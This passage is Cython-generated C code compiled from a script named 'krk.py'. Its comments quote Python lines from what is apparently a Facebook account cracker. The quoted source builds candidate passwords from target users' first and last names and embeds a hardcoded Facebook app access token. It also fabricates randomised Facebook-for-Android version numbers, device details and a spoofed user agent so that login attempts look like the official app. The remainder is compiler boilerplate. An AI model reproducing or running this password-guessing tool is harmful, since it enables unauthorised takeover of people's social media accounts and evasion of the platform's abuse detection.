        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_n_s_Last, __pyx_v_ln};
          __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_9, __pyx_n_s_Name, __pyx_v_names};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_lower); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 498, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_6 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        __pyx_t_9 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_9, __pyx_n_s_name, __pyx_t_4};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_pas, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":499
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_XDECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "krk.py":500
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'             # <<<<<<<<<<<<<<
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 */
        __pyx_t_5 = PyTuple_New(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_21 = 0;
        __pyx_t_22 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_random); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_22 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_22) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_22;
        __pyx_t_21 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_0_0);
        __pyx_t_21 += 5;
        __Pyx_GIVEREF(__pyx_kp_u_0_0);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u_0_0);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_tuple__71, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_22 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_22) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_22;
        __pyx_t_21 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
        __Pyx_GIVEREF(__pyx_t_17);
        PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_17);
        __pyx_t_17 = 0;
        __Pyx_INCREF(__pyx_kp_u__72);
        __pyx_t_21 += 1;
        __Pyx_GIVEREF(__pyx_kp_u__72);
        PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_kp_u__72);
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_random); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_22 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_22) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_22;
        __pyx_t_21 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 5, __pyx_t_21, __pyx_t_22); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbav, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "krk.py":501
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))             # <<<<<<<<<<<<<<
 *                         android_version = device['android_version']
 *                         model = device['model']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 501, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 501, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__73, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 501, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 501, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbv, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":502
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']             # <<<<<<<<<<<<<<
 *                         model = device['model']
 *                         build = device['build']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 502, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_android_version); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 502, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_android_version, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":503
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 *                         model = device['model']             # <<<<<<<<<<<<<<
 *                         build = device['build']
 *                         fblc = device['fblc']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_model); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 503, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_model, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":504
 *                         android_version = device['android_version']
 *                         model = device['model']
 *                         build = device['build']             # <<<<<<<<<<<<<<
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 504, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_build); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 504, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_build, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":505
 *                         model = device['model']
 *                         build = device['build']
 *                         fblc = device['fblc']             # <<<<<<<<<<<<<<
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fblc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fblc, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":506
 *                         build = device['build']
 *                         fblc = device['fblc']
 *                         fbcr = sim_id             # <<<<<<<<<<<<<<
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 506, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_XDECREF_SET(__pyx_v_fbcr, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":507
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']             # <<<<<<<<<<<<<<
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 507, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbmf); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 507, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbmf, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":508
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']             # <<<<<<<<<<<<<<
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 508, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbbd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 508, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbd, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":509
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']             # <<<<<<<<<<<<<<
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 509, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbdv); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 509, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdv, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":510
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']             # <<<<<<<<<<<<<<
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 510, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbsv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 510, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbsv, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":511
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']             # <<<<<<<<<<<<<<
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 511, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbca); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 511, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbca, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":512
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']             # <<<<<<<<<<<<<<
 *                         fbfw = '1'
 *                         fbrv = '0'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 512, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbdm); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 512, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdm, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":513
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'             # <<<<<<<<<<<<<<
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 */
        __Pyx_INCREF(__pyx_kp_s_1);
        __Pyx_XDECREF_SET(__pyx_v_fbfw, __pyx_kp_s_1);

        /* "krk.py":514
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 *                         fbrv = '0'             # <<<<<<<<<<<<<<
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 */
        __Pyx_INCREF(__pyx_kp_s_0);
        __Pyx_XDECREF_SET(__pyx_v_fbrv, __pyx_kp_s_0);

        /* "krk.py":515
 *                         fbfw = '1'
 *                         fbrv = '0'
 *                         fban = 'FB4A'             # <<<<<<<<<<<<<<
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3120};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'
 */
        __Pyx_INCREF(__pyx_n_s_FB4A);
        __Pyx_XDECREF_SET(__pyx_v_fban, __pyx_n_s_FB4A);

        /* "krk.py":516
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'             # <<<<<<<<<<<<<<
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3120};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 */
        __Pyx_INCREF(__pyx_kp_s_com_facebook_katana);
        __Pyx_XDECREF_SET(__pyx_v_fbpn, __pyx_kp_s_com_facebook_katana);

        /* "krk.py":517
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3120};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'             # <<<<<<<<<<<<<<
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 */
        __pyx_t_5 = PyNumber_Add(__pyx_kp_s_Davik_2_1_0_Linux_U_Android, __pyx_v_android_version); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_9_0_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_model); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_Build); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_build); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBAN); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fban); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_en_US_FB4A_FBAV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbav); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBBV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbbv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBDM); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbdm); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_density_4_0_width_1440_height_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
